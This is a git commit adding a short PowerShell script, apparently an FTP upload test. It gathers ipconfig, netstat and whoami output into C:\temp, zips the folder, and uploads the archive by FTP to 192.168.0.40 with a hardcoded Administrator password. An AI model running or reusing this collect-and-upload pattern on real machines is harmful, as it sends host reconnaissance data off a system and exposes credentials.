3b624c8f17b6d96160ffc0ab82789d1acecc4875
gun000 <88178216+gun000@users.noreply.github.com>
2022-09-19 17:31:48 +0900

    Add files via upload

---
+++ FTPTEST2.ps1
@@ -0,0 +1,20 @@
+﻿mkdir C:\temp
+
+
+ipconfig |out-File -FilePath 'C:\temp\.\ip.txt'
+netstat |out-File -FilePath 'C:\temp\.\stat.txt'
+whoami |out-File -FilePath 'C:\temp\.\wai.txt'
+'open 192.168.0.40 21
+user "Administrator" "Sentinel1!"
+lcd C:\temp
+put FTPTEST.zip' | Out-File -FilePath 'C:\temp\.\script.txt' #FTP 접속 파일 생성
+
+
+
+cd C:\temp
+Compress-Archive -Path "C:\Temp" "C:\temp\FTPTEST.zip" -CompressionLevel optimal # 특정폴더 압축
+
+
+
+
+ftp -v -n -i -d -s:"C:\temp\script.txt" #FTP
